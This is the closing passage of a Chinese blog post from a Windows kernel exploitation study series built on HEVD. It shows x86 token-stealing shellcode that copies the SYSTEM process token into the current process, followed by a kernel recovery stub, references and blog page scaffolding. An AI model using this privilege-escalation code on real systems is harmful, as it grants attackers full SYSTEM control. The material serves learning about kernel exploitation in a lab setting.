; Save registers state<br><br>        ; Start of Token Stealing Stub<br>        <span class="hljs-keyword">xor</span> eax, eax                         ; Set ZERO<br>        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread<br>                                             ; _KTHREAD is located at FS:[<span class="hljs-number">0x124</span>]<br><br>        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process<br><br>        mov ecx, eax                         ; Copy current process _EPROCESS structure<br><br>        mov edx, SYSTEM_PID                  ; WIN <span class="hljs-number">7</span> SP1 SYSTEM process PID = <span class="hljs-number">0x4</span><br><br>        SearchSystemPID:<br>            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink<br>            sub eax, FLINK_OFFSET<br>            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId<br>            jne SearchSystemPID<br><br>        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token<br>        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token<br>                                             ; with SYSTEM process nt!_EPROCESS.Token<br>        ; End of Token Stealing Stub<br><br>        popad                                ; Restore registers state<br><br>        ; Kernel Recovery Stub<br>        <span class="hljs-keyword">xor</span> eax, eax                         ; Set NTSTATUS SUCCEESS<br>        add esp, <span class="hljs-number">12</span>                          ; Fix the <span class="hljs-built_in">stack</span><br>        pop ebp                              ; Restore saved EBP<br>        ret <span class="hljs-number">8</span>                                ; Return cleanly<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>





<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://whereisk0shl.top/hevd-kernel-exploitation-uninitialized-stack-&amp;-heap.html">https://whereisk0shl.top/hevd-kernel-exploitation-uninitialized-stack-&amp;-heap.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/huity35/p/11231155.html">https://www.cnblogs.com/huity35/p/11231155.html</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/window-kernel/">window kernel</a>
                    
                  </div>
                
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/02/21/Windows_Kernel_Exploit_study_ENV/">
                        <span class="hidden-mobile">Windows 内核漏洞利用学习--（1）  环境配置</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
